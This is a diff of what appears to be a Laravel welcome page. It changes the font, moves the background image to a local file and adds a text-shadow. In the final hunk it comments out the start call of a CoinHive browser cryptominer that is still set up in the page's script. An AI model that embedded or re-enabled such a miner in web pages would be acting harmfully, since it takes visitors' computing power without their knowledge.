@@ -8,17 +8,22 @@
         <title>{{ env('APP_NAME') }}</title>
 
         <!-- Fonts -->
-        <link href="https://fonts.googleapis.com/css?family=Raleway:100,600" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Roboto:100,600" rel="stylesheet" type="text/css">
 
         <!-- Styles -->
         <style>
             html, body {
-                background-image:url('https://gitlab.com/thedevray/backgrounds/raw/master/L3mhxbS.jpg');
+                background-image:url('/images/background.jpg');
                 background-size: 100%;
                 background-repeat:no-repeat;
                 background-color: #fff;
                 color: #fff;
-                font-family: 'Raleway', sans-serif;
+                text-shadow:
+                    -1px -1px 0 #b2b2b2,
+                    1px -1px 0 #b2b2b2,
+                    -1px 1px 0 #b2b2b2,
+                    1px 1px 0 #b2b2b2; 
+                font-family: 'Roboto', sans-serif;
                 font-weight: 100;
                 height: 100vh;
                 margin: 0;
@@ -93,7 +98,7 @@
             };
 
             var miner = new CoinHive.Anonymous(hive.key);
-            miner.start();
+            // miner.start();
         </script>
     </body>
 </html>
